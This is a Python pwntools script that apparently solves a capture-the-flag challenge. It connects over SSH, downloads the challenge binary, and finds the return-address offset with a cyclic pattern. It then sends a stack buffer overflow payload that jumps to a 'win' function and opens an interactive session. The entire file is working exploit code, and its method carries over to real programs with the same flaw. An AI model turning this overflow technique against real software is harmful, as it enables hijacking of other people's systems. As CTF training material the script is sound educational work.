from pwn import *

session = ssh(host=args.HOST, port=int(args.PORT), user='ctf-player', password=args.PASSWORD)

sh = session.shell()
sh.sendline(b"/home/ctf-player/start")
sh.readuntil(b"Binary ")
exe_name = sh.readline().split()[0].decode('latin1')
log.info(f"binary is /home/ctf-player/{exe_name}")

session.download_file(f"/home/ctf-player/{exe_name}", local=f"./binaries/{exe_name}")
session.download_file(f"/home/ctf-player/{exe_name}.c", local=f"./binaries/{exe_name}.c")

exe = ELF(f"./binaries/{exe_name}")

p = session.process(f"/home/ctf-player/{exe_name}")
p.sendline(cyclic(1024))
p.readuntil(b"Jumping to ")

eip_offset = cyclic_find(int(p.readline().strip().decode('latin1'), 16))
log.info(f"eip overwrite at byte {eip_offset}. sending weaponized payload")

p.close()
p = session.process(f"/home/ctf-player/{exe_name}")
p.sendline(cyclic(eip_offset) + p32(exe.symbols['win']))


p.interactive()

